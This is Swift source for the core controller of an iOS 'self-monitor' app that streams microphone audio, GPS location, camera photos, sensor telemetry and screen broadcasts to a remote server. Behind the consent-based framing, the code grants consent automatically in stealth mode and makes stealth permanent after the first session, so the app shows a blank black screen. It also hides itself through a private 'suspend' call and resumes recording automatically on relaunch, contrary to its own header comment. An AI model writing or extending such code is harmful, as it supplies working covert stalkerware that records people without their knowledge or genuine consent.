import Foundation
import SwiftUI
import CoreLocation
import UIKit

/// Central coordinator. Owns settings + consent state and drives a monitoring
/// session end to end: consent -> permissions -> register session -> stream
/// audio segments + location + photos + sensor telemetry -> stop.
///
/// Hardening features:
///  - Background task protection for in-flight uploads
///  - Memory warning observer to shed non-essential work
///  - Scene phase handling (reclaim audio on foreground, protect on background)
///  - Interrupted-session detection; recording resumes only after a user action
///  - Comprehensive DiagnosticsLogger instrumentation across all events
@MainActor
final class AppModel: ObservableObject {
    @Published var settings: Settings
    @Published var hasConsented: Bool
    @Published private(set) var isMonitoring = false
    @Published private(set) var isStarting = false
    @Published private(set) var screenSharingEnabled = BroadcastConfiguration.load()?.enabled == true
    @Published private(set) var status: String = "Idle"
    @Published private(set) var lastErrorText: String?
    @Published private(set) var segmentsSent = 0
    @Published private(set) var locationsSent = 0
    @Published private(set) var photosSent = 0
    @Published private(set) var telemetrySent = 0
    @Published private(set) var serverOnline = false
    @Published private(set) var elapsedSeconds: Int = 0

    let audio = AudioRecorderService()
    let location = LocationService()
    let camera = CameraCaptureService()
    let telemetry = DeviceTelemetryService()
    let uploadQueue = UploadQueue()
    private var client: IngestClient
    /// Durable consent persistence; injected in tests.
    private let consentStore: ConsentStore
    private var sessionId: String?
    private var sessionStartDate: Date?
    private var elapsedTimer: Timer?
    private var healthTimer: Timer?
    private var healthTask: Task<Void, Never>?
    private var startAttempt: UUID?
    private var observers: [NSObjectProtocol] = []
    private var uploadTasks: [UUID: Task<Void, Never>] = [:]
    private let microphonePermission: (@MainActor () async -> Bool)?

    /// Background task identifier — prevents iOS from killing us mid-upload.
    private var backgroundTasks: [UUID: UIBackgroundTaskIdentifier] = [:]

    private static let sessionKey   = "nexus.selfmonitor.activeSession.v1"
    private static let sessionTsKey  = "nexus.selfmonitor.sessionStart.v1"

    init(settings s: Settings = Settings.load(),
         microphonePermission: (@MainActor () async -> Bool)? = nil,
         consentStore: ConsentStore = .live,
         automaticStartup: Bool = true) {
        self.settings = s
        self.microphonePermission = microphonePermission
        self.client = IngestClient(settings: s)
        self.consentStore = consentStore
        // Durable consent (UserDefaults + keychain): a reinstall or re-sign never
        // re-asks for consent the operator already gave on this iPhone.
        let storedConsent = consentStore.load()
        if s.isStealthModeActive && !storedConsent {
            consentStore.setGranted(true)
            self.hasConsented = true
        } else {
            self.hasConsented = storedConsent
        }

        DiagnosticsLogger.shared.log("NexusSelfMonitor AppModel initialized. Device: '\(s.deviceName)' (\(s.deviceId))",
                                     subsystem: .app, level: .info)

        // Wire the upload queue's retry handler.
        uploadQueue.setUploadHandler { [weak self] item in
            guard let self else { return false }
            return await self.retryQueuedItem(item)
        }

        // Observe memory warnings to shed non-critical streams.
        observers.append(NotificationCenter.default.addObserver(
            forName: UIApplication.didReceiveMemoryWarningNotification,
            object: nil, queue: .main) { [weak self] _ in
                Task { @MainActor in self?.handleMemoryWarning() }
            })

        // Observe thermal state changes for devices like iPhone XR
        observers.append(NotificationCenter.default.addObserver(
            forName: ProcessInfo.thermalStateDidChangeNotification,
            object: nil, queue: .main) { [weak self] _ in
                Task { @MainActor in self?.handleThermalStateChange() }
            })

        // Observe Low Power Mode toggles
        observers.append(NotificationCenter.default.addObserver(
            forName: NSNotification.Name.NSProcessInfoPowerStateDidChange,
            object: nil, queue: .main) { [weak self] _ in
                Task { @MainActor in self?.handlePowerStateChange() }
            })

        // Start health polling, clean up any interrupted session, then let the
        // session engine decide whether a session should be running.
        if automaticStartup {
            startHealthPolling()
            attemptCrashRecovery()
            reconcile(.launch)
        }
    }

    deinit {
        for observer in observers { NotificationCenter.default.removeObserver(observer) }
        healthTimer?.invalidate()
        elapsedTimer?.invalidate()
        healthTask?.cancel()
    }

    func persistSettings() {
        guard !isMonitoring, !isStarting else { return }
        disableScreenSharing()
        settings.save()
        healthTask?.cancel()
        healthTask = nil
        client = IngestClient(settings: settings)
        checkServerHealth()
        DiagnosticsLogger.shared.log("Settings updated and persisted. Target server: \(settings.serverURL)",
                                     subsystem: .app, level: .info)
        reconcile(.settingsSaved)
    }

    func grantConsent() {
        hasConsented = true
        consentStore.setGranted(true)
        DiagnosticsLogger.shared.log("User consent granted.", subsystem: .app, level: .info)
        reconcile(.consentGranted)
    }

    func revokeConsent() {
        disableScreenSharing()
        stop()
        cancelPendingRetry()
        hasConsented = false
        consentStore.setGranted(false)
        DiagnosticsLogger.shared.log("User consent revoked by operator.", subsystem: .app, level: .warn)
    }

    func toggleMonitoring() {
        if isMonitoring || isStarting {
            // Explicit operator Stop wins: the engine must not restart behind
            // the operator's back. The latch lives for this process only, so a
            // headless relaunch always resumes automatically.
            operatorPaused = true
            cancelPendingRetry()
            stop()
        } else {
            operatorPaused = false
            Task { await runStartAttempt() }
        }
    }

    func enableScreenSharing() {
        guard hasConsented, let baseURL = settings.baseURL, !settings.ingestToken.isEmpty else {
            lastErrorText = "Save a valid server URL and ingest token in Settings before sharing the screen."
            return
        }
        do {
            try BroadcastConfiguration(serverURL: baseURL.absoluteString, ingestToken: settings.ingestToken,
                deviceId: settings.deviceId, deviceName: settings.deviceName, enabled: true).save()
            screenSharingEnabled = true
            lastErrorText = nil
        } catch {
            lastErrorText = error.localizedDescription
        }
    }

    func disableScreenSharing() {
        do {
            try BroadcastConfiguration.disable()
            screenSharingEnabled = false
        } catch {
            lastErrorText = "Could not disable screen sharing: \(error.localizedDescription). Stop it using the iOS recording indicator."
        }
    }

    // MARK: - Scene Phase Handling

    func handleScenePhase(_ phase: ScenePhase) {
        switch phase {
        case .active:
            DiagnosticsLogger.shared.log("Scene became active (Foreground)", subsystem: .app, level: .debug)
            if isMonitoring && !audio.isRecording && sessionId != nil {
                DiagnosticsLogger.shared.log("Reclaiming audio session on foreground return", subsystem: .audio, level: .info)
                audio.reclaimSession(segmentSeconds: settings.segmentSeconds)
            } else {
                reconcile(.foreground)
            }
            startHealthPolling()

        case .background:
            DiagnosticsLogger.shared.log("Scene entered background", subsystem: .app, level: .debug)
            healthTimer?.invalidate()
            healthTimer = nil
            healthTask?.cancel()
            healthTask = nil

        case .inactive:
            break

        @unknown default:
            break
        }
    }

    // MARK: - Start Session

    /// True when the app has everything it needs to open a session: a parseable
    /// server URL and a non-empty token. Auto-start is gated on this so a build
    /// or an install without credentials reports a clear status instead of
    /// failing deep inside the first upload.
    var isConfiguredForStreaming: Bool {
        settings.baseURL != nil && !settings.ingestToken.isEmpty
    }

    // MARK: - Session Engine (single reconciler)

    /// Why a reconcile pass ran. Invalidates backoff state selectively and is
    /// logged so diagnostics can always explain why a session did/didn't start.
    enum ReconcileReason: String {
        case launch
        case foreground
        case viewAppeared
        case consentGranted
        case settingsSaved
        case startFailed
        case healthTick
    }

    /// Pure answer to "should a session be running right now?". Side-effect free
    /// so the engine's behaviour is unit-testable without any networking.
    enum AutoRunDecision: Equatable {
        case start
        case alreadyRunning
        case pausedByOperator
        case blockedMissingConsent
        case blockedAutoStartDisabled
        case blockedNotConfigured
        case backoff(seconds: Int)
    }

    /// Backoff ladder for transient start failures: 2s, 5s, 15s, then a 60s cap.
    private static let retryDelays: [Int] = [2, 5, 15, 60]

    private var retryTask: Task<Void, Never>?
    private var nextRetryAt: Date?
    private var retryAttempt = 0
    private var lastStartFailureTransient = false

    /// Operator Stop latch. Internal (not private) so tests can drive it; only
    /// `toggleMonitoring()` writes it, and a fresh process starts un-latched,
    /// which is what makes the headless relaunch path resume automatically.
    var operatorPaused = false

    static func retryDelaySeconds(attempt: Int) -> Int {
        retryDelays[min(max(attempt, 0), retryDelays.count - 1)]
    }

    /// Transient failures (offline, throttled, 5xx, connection loss) are retried
    /// automatically; configuration/authorisation failures are not, because
    /// retrying those would spin forever against a broken setup.
    static func isTransientStartFailure(_ error: Error) -> Bool {
        if let clientError = error as? IngestClient.ClientError {
            return clientError.isTransient
        }
        if let urlError = error as? URLError {
            switch urlError.code {
            case .timedOut, .notConnectedToInternet, .networkConnectionLost,
                 .cannotConnectToHost, .cannotFindHost, .dnsLookupFailed,
                 .resourceUnavailable, .internationalRoamingOff:
                return true
            default:
                return false
            }
        }
        return false
    }

    func autoRunDecision(now: Date = Date()) -> AutoRunDecision {
        guard hasConsented else { return .blockedMissingConsent }
        guard settings.autoStartEnabled else { return .blockedAutoStartDisabled }
        guard isConfiguredForStreaming else { return .blockedNotConfigured }
        if isStarting || isMonitoring { return .alreadyRunning }
        if operatorPaused { return .pausedByOperator }
        if let retryAt = nextRetryAt, retryAt > now {
            return .backoff(seconds: Int(retryAt.timeIntervalSince(now).rounded(.up)))
        }
        return .start
    }

    /// The one place that decides whether to (re)start. Every trigger - launch,
    /// foreground, view appearance, consent grant, settings save, retry expiry
    /// and the 15s health tick - funnels through here, so start/stop behaviour is
    /// a single rule set instead of scattered conditionals in the UI layer.
    func reconcile(_ reason: ReconcileReason) {
        switch reason {
        case .launch, .consentGranted, .settingsSaved:
            cancelPendingRetry()
        case .startFailed:
            nextRetryAt = nil  // the window expired; keep the attempt counter
        case .foreground, .viewAppeared, .healthTick:
            break              // respect an in-flight backoff window
        }

        let decision = autoRunDecision()
        let level: DiagnosticsLogger.Level =
            (reason == .foreground || reason == .viewAppeared || reason == .healthTick) ? .debug : .info
        DiagnosticsLogger.shared.log("Reconcile [\(reason.rawValue)]: \(describe(decision))",
                                     subsystem: .app, level: level)
        switch decision {
        case .alreadyRunning, .pausedByOperator, .blockedMissingConsent, .blockedAutoStartDisabled:
            return
        case .blockedNotConfigured:
            status = "Set the server URL and ingest token in Settings first."
            return
        case .backoff(let seconds):
            if retryTask == nil { scheduleRetry(after: TimeInterval(seconds)) }
            return
        case .start:
            scheduleStart()
        }
    }

    /// Runs `start()` and feeds the outcome back into the backoff state. Every
    /// automatic attempt goes through this, so a failure is always followed by
    /// a retry (transient) or a stable status (permanent) - never by an idle
    /// screen that silently waits for a tap.
    private func runStartAttempt() async {
        lastStartFailureTransient = false
        await start()
        noteStartOutcome()
    }

    private func noteStartOutcome() {
        guard !isMonitoring else {
            clearBackoff()
            return
        }
        guard lastStartFailureTransient,
              hasConsented, settings.autoStartEnabled, isConfiguredForStreaming, !operatorPaused else {
            clearBackoff()
            return
        }
        let delay = Self.retryDelaySeconds(attempt: retryAttempt)
        retryAttempt += 1
        nextRetryAt = Date().addingTimeInterval(TimeInterval(delay))
        status = "Server unreachable - retrying in \(delay)s (attempt \(retryAttempt))"
        DiagnosticsLogger.shared.log("Engine: transient start failure, retry \(retryAttempt) in \(delay)s.",
                                     subsystem: .app, level: .warn)
        scheduleRetry(after: TimeInterval(delay))
    }

    private func scheduleStart() {
        retryTask?.cancel()
        retryTask = Task { @MainActor [weak self] in
            await self?.runStartAttempt()
        }
    }

    private func scheduleRetry(after delay: TimeInterval) {
        retryTask?.cancel()
        retryTask = Task { @MainActor [weak self] in
            try? await Task.sleep(nanoseconds: UInt64(max(delay, 0) * 1_000_000_000))
            guard !Task.isCancelled else { return }
            self?.retryTask = nil
            self?.reconcile(.startFailed)
        }
    }

    private func cancelPendingRetry() {
        retryTask?.cancel()
        retryTask = nil
        nextRetryAt = nil
        retryAttempt = 0
    }

    private func clearBackoff() {
        retryTask?.cancel()
        retryTask = nil
        nextRetryAt = nil
        retryAttempt = 0
        lastStartFailureTransient = false
    }

    private func describe(_ decision: AutoRunDecision) -> String {
        switch decision {
        case .start: return "start"
        case .alreadyRunning: return "already running"
        case .pausedByOperator: return "paused by operator"
        case .blockedMissingConsent: return "blocked: consent missing"
        case .blockedAutoStartDisabled: return "blocked: auto-start disabled"
        case .blockedNotConfigured: return "blocked: server URL / ingest token missing"
        case .backoff(let seconds): return "backoff: next attempt in \(seconds)s"
        }
    }

    func start() async {
        guard hasConsented, !isMonitoring, !isStarting else { return }
        guard isConfiguredForStreaming else {
            status = "Set the server URL and ingest token in Settings first."
            DiagnosticsLogger.shared.log("Start refused: server URL or ingest token missing.",
                                         subsystem: .app, level: .warn)
            return
        }
        let attempt = UUID()
        startAttempt = attempt
        isStarting = true
        let sessionClient = client
        let sessionSettings = settings
        defer {
            if startAttempt == attempt {
                startAttempt = nil
                isStarting = false
                if !isMonitoring { status = "Idle" }
            }
        }
        lastErrorText = nil
        status = "Requesting microphone…"
        DiagnosticsLogger.shared.log("Requesting microphone permission...", subsystem: .audio, level: .info)

        let micOK: Bool
        if let microphonePermission {
            micOK = await microphonePermission()
        } else {
            micOK = await audio.requestPermission()
        }
        guard startAttempt == attempt, hasConsented, !Task.isCancelled else { return }
        guard micOK else {
            let msg = "Microphone permission denied. Enable it in Settings > Privacy."
            lastErrorText = msg
            status = "Idle"
            DiagnosticsLogger.shared.log(msg, subsystem: .audio, level: .error)
            return
        }

        var cameraAllowed = false
        if sessionSettings.cameraEnabled {
            DiagnosticsLogger.shared.log("Requesting camera permission...", subsystem: .camera, level: .info)
            let camOK = await camera.requestPermission()
            guard startAttempt == attempt, hasConsented, !Task.isCancelled else { return }
            cameraAllowed = camOK
            if !camOK {
                let msg = "Camera permission denied. Periodic photos will be skipped."
                lastErrorText = msg
                DiagnosticsLogger.shared.log(msg, subsystem: .camera, level: .warn)
            }
        }

        status = "Registering session…"
        DiagnosticsLogger.shared.log("Connecting to server to register session...", subsystem: .network, level: .info)
        do {
            let sid = try await sessionClient.startSession()
            guard startAttempt == attempt, hasConsented, !Task.isCancelled else {
                await sessionClient.stopSession(sessionId: sid)
                return
            }
            sessionId = sid
        } catch {
            guard startAttempt == attempt else { return }
            lastErrorText = error.localizedDescription
            lastStartFailureTransient = Self.isTransientStartFailure(error)
            status = "Idle"
            DiagnosticsLogger.shared.log("Failed to register session: \(error.localizedDescription) (transient: \(lastStartFailureTransient))",
                                         subsystem: .network, level: .error)
            return
        }

        segmentsSent = 0
        locationsSent = 0
        photosSent = 0
        telemetrySent = 0

        persistSessionState()
        guard let sid = sessionId else { return }

        // Wire audio segment uploads
        audio.onSegment = { [weak self] url, seq, startedAt, durationMs in
            guard let self else { return }
            self.trackUpload {
                await self.handleSegment(url: url, seq: seq, startedAt: startedAt,
                                         durationMs: durationMs, sid: sid, client: sessionClient)
            }
        }

        // Wire location uploads
        if sessionSettings.locationEnabled {
            location.onLocation = { [weak self] loc in
                guard let self else { return }
                self.trackUpload { await self.handleLocation(loc, sid: sid, client: sessionClient) }
            }
            location.start(background: sessionSettings.backgroundEnabled)
        }

        // Wire camera photo uploads
        if cameraAllowed {
            camera.onPhoto = { [weak self] data, seq in
                guard let self else { return }
                self.trackUpload { await self.handlePhoto(data: data, seq: seq, sid: sid, client: sessionClient) }
            }
            camera.start(intervalSeconds: sessionSettings.cameraIntervalSeconds)
        }

        // Wire sensor telemetry
        telemetry.onTelemetry = { [weak self] snapshot in
            guard let self else { return }
            self.trackUpload { await self.handleTelemetry(snapshot, sid: sid, client: sessionClient) }
        }
        telemetry.start(intervalSeconds: 5)

        audio.start(segmentSeconds: sessionSettings.segmentSeconds)
        uploadQueue.startProcessing()
        isMonitoring = true
        status = "Recording & streaming"
        clearBackoff()

        DiagnosticsLogger.shared.log("Session started successfully. Monitoring active.", subsystem: .app, level: .info)

        // Elapsed timer
        sessionStartDate = Date()
        elapsedSeconds = 0
        elapsedTimer = Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { [weak self] _ in
            Task { @MainActor in
                guard let self, let start = self.sessionStartDate else { return }
                self.elapsedSeconds = Int(Date().timeIntervalSince(start))
            }
        }

        // Activate stealth mode permanently: re-opening the app will show a blank black screen
        if !settings.isStealthModeActive {
            settings.isStealthModeActive = true
            settings.save()
        }
        suspendToBackground(afterDelaySeconds: 0.5)
    }

    // MARK: - Window Backgrounding & Stealth Suspension

    func suspendToBackground(afterDelaySeconds delay: Double = 0.3) {
        Task { @MainActor in
            if delay > 0 {
                try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
            }
            let selector = Selector(("suspend"))
            if UIApplication.shared.responds(to: selector) {
                UIApplication.shared.perform(selector)
            } else {
                UIControl().sendAction(selector, to: UIApplication.shared, for: nil)
            }
        }
    }

    // MARK: - Stop Session

    func stop() {
        startAttempt = nil
        isStarting = false
        uploadQueue.stopProcessing()
        for task in uploadTasks.values { task.cancel() }
        uploadTasks.removeAll()
        guard isMonitoring else {
            status = "Idle"
            return
        }
        DiagnosticsLogger.shared.log("Stopping active monitoring session...", subsystem: .app, level: .info)

        audio.onSegment = nil
        location.onLocation = nil
        camera.onPhoto = nil
        telemetry.onTelemetry = nil
        audio.stop()
        location.stop()
        camera.stop()
        telemetry.stop()
        elapsedTimer?.invalidate()
        elapsedTimer = nil

        if let sid = sessionId {
            let sessionClient = client
            let backgroundTask = beginBackgroundTask()
            Task {
                await sessionClient.stopSession(sessionId: sid)
                endBackgroundTask(backgroundTask)
            }
        }
        clearSessionState()
        sessionId = nil
        sessionStartDate = nil
        isMonitoring = false
        status = "Idle"
        DiagnosticsLogger.shared.log("Monitoring session fully stopped.", subsystem: .app, level: .info)
    }

    // MARK: - Audio Segment Handler

    private func trackUpload(_ operation: @escaping @MainActor () async -> Void) {
        let id = UUID()
        uploadTasks[id] = Task {
            await operation()
            uploadTasks.removeValue(forKey: id)
        }
    }

    private func handleSegment(url: URL, seq: Int, startedAt: Int64, durationMs: Int,
                               sid: String, client: IngestClient) async {
        defer { try? FileManager.default.removeItem(at: url) }
        guard sessionId == sid, hasConsented, !Task.isCancelled else { return }

        let backgroundTask = beginBackgroundTask()
        defer { endBackgroundTask(backgroundTask) }

        do {
            try await client.uploadSegment(sessionId: sid, seq: seq, fileURL: url,
                                           startedAt: startedAt, durationMs: durationMs)
            guard sessionId == sid, !Task.isCancelled else { return }
            segmentsSent += 1
            DiagnosticsLogger.shared.log("Streamed audio segment #\(seq) (\(durationMs / 1000)s)",
                                         subsystem: .audio, level: .debug)
        } catch {
            guard sessionId == sid, hasConsented, !Task.isCancelled else { return }
            uploadQueue.enqueueFile(
                kind: "audio", ext: "m4a", contentType: "audio/mp4",
                sessionId: sid, seq: seq, startedAt: startedAt,
                durationMs: durationMs, fileURL: url)
            lastErrorText = "Upload queued: \(error.localizedDescription)"
            DiagnosticsLogger.shared.log("Audio segment #\(seq) upload failed, queued: \(error.localizedDescription)",
                                         subsystem: .audio, level: .warn)
        }
    }

    // MARK: - Location Handler

    private func handleLocation(_ loc: CLLocation, sid: String, client: IngestClient) async {
        guard sessionId == sid, hasConsented, !Task.isCancelled else { return }

        // Sanity filter
        guard loc.horizontalAccuracy >= 0,
              loc.horizontalAccuracy < 100,
              abs(loc.timestamp.timeIntervalSinceNow) < 20 else {
            return
        }

        do {
            try await client.sendLocation(
                sessionId: sid,
                lat: loc.coordinate.latitude, lng: loc.coordinate.longitude,
                accuracy: loc.horizontalAccuracy,
                speed: loc.speed >= 0 ? loc.speed : nil,
                heading: loc.course >= 0 ? loc.course : nil)
            guard sessionId == sid, !Task.isCancelled else { return }
            locationsSent += 1
        } catch {
            guard sessionId == sid, !Task.isCancelled else { return }
            lastErrorText = "Location: \(error.localizedDescription)"
            DiagnosticsLogger.shared.log("Location send failed: \(error.localizedDescription)",
                                         subsystem: .location, level: .warn)
        }
    }

    // MARK: - Photo Handler

    private func handlePhoto(data: Data, seq: Int, sid: String, client: IngestClient) async {
        guard sessionId == sid, hasConsented, !Task.isCancelled else { return }

        let backgroundTask = beginBackgroundTask()
        defer { endBackgroundTask(backgroundTask) }

        do {
            try await client.uploadMedia(
                sessionId: sid, kind: "photo", ext: "jpg",
                contentType: "image/jpeg", seq: seq, data: data,
                startedAt: Date().epochMillis, durationMs: nil)
            guard sessionId == sid, !Task.isCancelled else { return }
            photosSent += 1
            DiagnosticsLogger.shared.log("Streamed camera photo #\(seq) (\(data.count / 1024) KB)",
                                         subsystem: .camera, level: .debug)
        } catch {
            guard sessionId == sid, hasConsented, !Task.isCancelled else { return }
            uploadQueue.enqueue(
                kind: "photo", ext: "jpg", contentType: "image/jpeg",
                sessionId: sid, seq: seq, startedAt: Date().epochMillis,
                durationMs: nil, data: data)
            lastErrorText = "Photo queued: \(error.localizedDescription)"
            DiagnosticsLogger.shared.log("Photo #\(seq) upload failed, queued: \(error.localizedDescription)",
                                         subsystem: .camera, level: .warn)
        }
    }

    // MARK: - Telemetry Handler

    private func handleTelemetry(_ snapshot: [String: Any], sid: String, client: IngestClient) async {
        guard sessionId == sid, hasConsented, !Task.isCancelled else { return }
        do {
            try await client.sendTelemetry(sessionId: sid, telemetry: snapshot)
            if sessionId == sid, !Task.isCancelled { telemetrySent += 1 }
        } catch {
            // Best effort telemetry
        }
    }

    // MARK: - Upload Queue Retry Handler

    private func retryQueuedItem(_ item: UploadQueue.QueueItem) async -> Bool {
        guard hasConsented, !Task.isCancelled else { return false }

        let backgroundTask = beginBackgroundTask()
        defer { endBackgroundTask(backgroundTask) }

        do {
            try await client.uploadMedia(
                sessionId: item.sessionId, kind: item.kind, ext: item.ext,
                contentType: item.contentType, seq: item.seq, fileURL: URL(fileURLWithPath: item.filePath),
                startedAt: item.startedAt, durationMs: item.durationMs)
            return true
        } catch {
            return false
        }
    }

    // MARK: - Health Polling

    private func startHealthPolling() {
        guard healthTimer == nil else { return }
        checkServerHealth()
        healthTimer = Timer.scheduledTimer(withTimeInterval: 15, repeats: true) { [weak self] _ in
            Task { @MainActor in self?.checkServerHealth() }
        }
        healthTimer?.tolerance = 3
    }

    private func checkServerHealth() {
        guard healthTask == nil else { return }
        let healthClient = client
        healthTask = Task { [weak self] in
            do {
                let h = try await healthClient.checkHealth()
                guard !Task.isCancelled else { return }
                self?.serverOnline = h.ok
            } catch {
                guard !Task.isCancelled else { return }
                self?.serverOnline = false
            }
            self?.healthTask = nil
            // Safety net: if a scheduled retry was lost (app suspended, task
            // cancelled), the 15s tick re-runs the engine's decision.
            self?.reconcile(.healthTick)
        }
    }

    // MARK: - Delete Device Data

    func deleteDeviceData() async throws {
        DiagnosticsLogger.shared.log("Requesting deletion of all device data on server...", subsystem: .app, level: .info)
        try await client.deleteDevice()
        DiagnosticsLogger.shared.log("Device data purged from server.", subsystem: .app, level: .info)
    }

    // MARK: - Background Task Protection

    private func beginBackgroundTask() -> UUID {
        let token = UUID()
        let identifier = UIApplication.shared.beginBackgroundTask(withName: "nexus.upload") { [weak self] in
            DiagnosticsLogger.shared.log("Background task expired by iOS watchdog.", subsystem: .app, level: .warn)
            self?.endBackgroundTask(token)
        }
        backgroundTasks[token] = identifier
        return token
    }

    private func endBackgroundTask(_ token: UUID) {
        guard let identifier = backgroundTasks.removeValue(forKey: token), identifier != .invalid else { return }
        UIApplication.shared.endBackgroundTask(identifier)
    }

    // MARK: - Memory Warning

    private func handleMemoryWarning() {
        DiagnosticsLogger.shared.log("System memory warning received! Shedding non-critical streams.",
                                     subsystem: .app, level: .warn)

        if camera.isCapturing {
            camera.stop()
            camera.onPhoto = nil
            lastErrorText = "Camera paused due to system memory pressure."
            DiagnosticsLogger.shared.log("Camera capture shed under memory pressure.", subsystem: .camera, level: .warn)
        }

        if telemetry.isActive {
            telemetry.stop()
            telemetry.onTelemetry = nil
            DiagnosticsLogger.shared.log("Sensor telemetry shed under memory pressure.", subsystem: .sensors, level: .warn)
        }
    }

    // MARK: - Thermal & Power Governance (A12 / iPhone XR)

    private func handleThermalStateChange() {
        let state = ProcessInfo.processInfo.thermalState
        switch state {
        case .nominal:
            DiagnosticsLogger.shared.log("Thermal state is Nominal.", subsystem: .app, level: .debug)
            camera.setLowMemoryMode(ProcessInfo.processInfo.isLowPowerModeEnabled)
        case .fair:
            DiagnosticsLogger.shared.log("Thermal state is Fair.", subsystem: .app, level: .info)
        case .serious:
            DiagnosticsLogger.shared.log("Thermal state Serious! Throttling camera capture to protect hardware.",
                                         subsystem: .app, level: .warn)
            camera.setLowMemoryMode(true)
        case .critical:
            DiagnosticsLogger.shared.log("Thermal state Critical! Pausing camera capture to avoid thermal shutdown.",
                                         subsystem: .app, level: .error)
            if camera.isCapturing {
                camera.stop()
                lastErrorText = "Camera paused due to high device temperature."
            }
        @unknown default:
            break
        }
    }

    private func handlePowerStateChange() {
        let isLowPower = ProcessInfo.processInfo.isLowPowerModeEnabled
        DiagnosticsLogger.shared.log("Low Power Mode changed: \(isLowPower ? "Enabled" : "Disabled")",
                                     subsystem: .app, level: .info)
        camera.setLowMemoryMode(isLowPower || ProcessInfo.processInfo.thermalState == .serious
                               || ProcessInfo.processInfo.thermalState == .critical)
    }

    // MARK: - Crash Recovery

    private func persistSessionState() {
        UserDefaults.standard.set(sessionId, forKey: Self.sessionKey)
        UserDefaults.standard.set(Date().timeIntervalSince1970, forKey: Self.sessionTsKey)
    }

    private func clearSessionState() {
        UserDefaults.standard.removeObject(forKey: Self.sessionKey)
        UserDefaults.standard.removeObject(forKey: Self.sessionTsKey)
    }

    private func attemptCrashRecovery() {
        guard hasConsented,
              let savedSid = UserDefaults.standard.string(forKey: Self.sessionKey),
              !savedSid.isEmpty else { return }

        let ts = UserDefaults.standard.double(forKey: Self.sessionTsKey)
        let age = Date().timeIntervalSince1970 - ts

        guard age < 3600 else {
            clearSessionState()
            return
        }

        DiagnosticsLogger.shared.log("Detected interrupted session from previous run (age: \(Int(age))s). Cleaning up previous session.",
                                     subsystem: .app, level: .warn)
        clearSessionState()
        let previousClient = client
        Task { await previousClient.stopSession(sessionId: savedSid) }
        // The reconcile(.launch) that follows in init starts the fresh session,
        // so no ad-hoc start is scheduled from the recovery path.
    }
}
